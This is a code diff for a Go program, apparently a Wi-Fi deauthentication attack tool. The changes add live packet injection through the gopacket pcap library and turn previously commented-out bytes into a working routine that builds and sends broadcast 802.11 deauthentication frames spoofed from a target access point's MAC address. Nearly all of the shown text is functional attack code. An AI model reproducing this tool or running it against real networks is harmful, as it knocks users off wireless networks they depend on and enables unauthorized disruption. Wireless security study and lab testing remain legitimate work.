@@ -5,10 +5,14 @@ import (
 	"encoding/binary"
 	"flag"
 	"fmt"
+	"log"
 	"os"
 	"os/exec"
 	"strconv"
 	"strings"
+	"time"
+
+	"github.com/google/gopacket/pcap"
 )
 
 func main() {
@@ -24,6 +28,10 @@ func main() {
 	}
 	Deauth_Attack(*User_interface, *Ap_mac, *Station_mac, *Auth_flag)
 }
+
+const (
+	defaultSnapLen = 262144
+)
 
 type StringArray []string
 
@@ -81,6 +89,14 @@ func _Init_(User_interface string) int {
 }
 
 func AP_broadcast(User_interface string, Ap_mac string) {
+
+	handle, err := pcap.OpenLive(User_interface, defaultSnapLen, true, pcap.BlockForever)
+	if err != nil {
+		log.Fatal(err)
+		os.Exit(-1)
+	}
+	defer handle.Close()
+
 	CH := _Init_(User_interface)
 	fmt.Println("AP_broadcast | Channel : ", CH)
 	buffer := new(bytes.Buffer)
@@ -99,9 +115,14 @@ func AP_broadcast(User_interface string, Ap_mac string) {
 	}
 	fmt.Println(tmp_mac)
 
-	// Deauth_AP_MAC := [12]byte{0xb2, 0x9f, 0x30, 0x4e, 0xed, 0xdb, 0xb2, 0x9f, 0x30, 0x4e, 0xed, 0xdb}
-	// Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
+	Deauth_AP_MAC := [12]byte{tmp_mac[0], tmp_mac[1], tmp_mac[2], tmp_mac[3], tmp_mac[4], tmp_mac[5], tmp_mac[0], tmp_mac[1], tmp_mac[2], tmp_mac[3], tmp_mac[4], tmp_mac[5]}
+	binary.Write(buffer, binary.LittleEndian, Deauth_AP_MAC)
+	Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
+	binary.Write(buffer, binary.LittleEndian, Deauth_Footer)
+	Deauth_packet := buffer.Bytes()
 
+	handle.WritePacketData(Deauth_packet)
+	time.Sleep(time.Millisecond * 50)
 }
 
 func AP_unicast(User_interface string, Ap_mac string, Station_mac string) {
